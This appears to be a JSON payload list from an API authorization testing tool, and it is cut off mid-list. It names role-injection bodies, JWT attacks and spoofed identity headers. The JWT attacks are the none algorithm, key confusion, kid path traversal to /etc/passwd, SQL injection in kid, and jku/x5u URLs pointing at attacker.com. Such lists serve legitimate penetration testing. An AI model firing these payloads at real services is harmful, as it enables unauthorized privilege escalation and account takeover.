  "attack_vectors": {
    "jwt_role_manipulation": [
      {"payload": "{\"role\": \"admin\"}", "description": "Direct role injection", "target": "body"},
      {"payload": "{\"role\": \"administrator\"}", "description": "Full admin role", "target": "body"},
      {"payload": "{\"role\": \"superadmin\"}", "description": "Super admin role", "target": "body"},
      {"payload": "{\"is_admin\": true}", "description": "Admin flag set", "target": "body"},
      {"payload": "{\"is_admin\": 1}", "description": "Admin flag numeric", "target": "body"},
      {"payload": "{\"is_admin\": \"true\"}", "description": "Admin flag string", "target": "body"},
      {"payload": "{\"admin\": true}", "description": "Admin property", "target": "body"},
      {"payload": "{\"user_type\": \"admin\"}", "description": "User type admin", "target": "body"},
      {"payload": "{\"permissions\": [\"admin\", \"read\", \"write\"]}", "description": "Permissions array admin", "target": "body"},
      {"payload": "{\"level\": 999}", "description": "High level value", "target": "body"},
      {"payload": "{\"priority\": \"high\"}", "description": "High priority", "target": "body"},
      {"payload": "{\"status\": \"active\"}", "description": "Active status", "target": "body"}
    ],
    "jwt_algorithm_manipulation": [
      {"payload": "alg: none", "description": "Remove signature (none algorithm)", "target": "jwt_header"},
      {"payload": "alg: HS256 with public key as secret", "description": "Algorithm confusion", "target": "jwt_header"},
      {"payload": "alg: RS256 → HS256", "description": "Public key as HMAC secret", "target": "jwt_header"},
      {"payload": "kid: ../../etc/passwd", "description": "Path traversal in kid", "target": "jwt_header"},
      {"payload": "kid: ../../../app/key", "description": "Path traversal alt", "target": "jwt_header"},
      {"payload": "kid: \" OR \"1\"=\"1", "description": "SQL injection in kid", "target": "jwt_header"},
      {"payload": "jku: https://attacker.com/jwks.json", "description": "jwks URI injection", "target": "jwt_header"},
      {"payload": "x5u: https://attacker.com/cert.pem", "description": "x5u URI injection", "target": "jwt_header"}
    ],
    "header_manipulation": [
      {"header": "X-User-ID", "value": "1", "description": "User ID header injection"},
      {"header": "X-User-ID", "value": "0", "description": "Admin user ID (0 or 1)"},
      {"header": "X-User-ID", "value": "admin", "description": "Admin username"},
      {"header": "X-Admin", "value": "true", "description": "Admin header"},
      {"header": "X-Admin", "value": "1", "description": "Admin header numeric"},
      {"header": "X-Role", "value": "admin", "description": "Role header"},
      {"header": "X-Role", "value": "administrator", "description": "Administrator role"},
      {"header": "X-Permission", "value": "admin", "description": "Permission header"},
      {"header": "X-Privileged", "value": "true", "description": "Privileged header"},
      {"header": "X-Authenticated", "value": "true", "description": "Authenticated header"},
      {"header": "Authorization", "value": "Bearer fake_token", "description": "Fake bearer token"}
    ],
    "idor_user_access": [
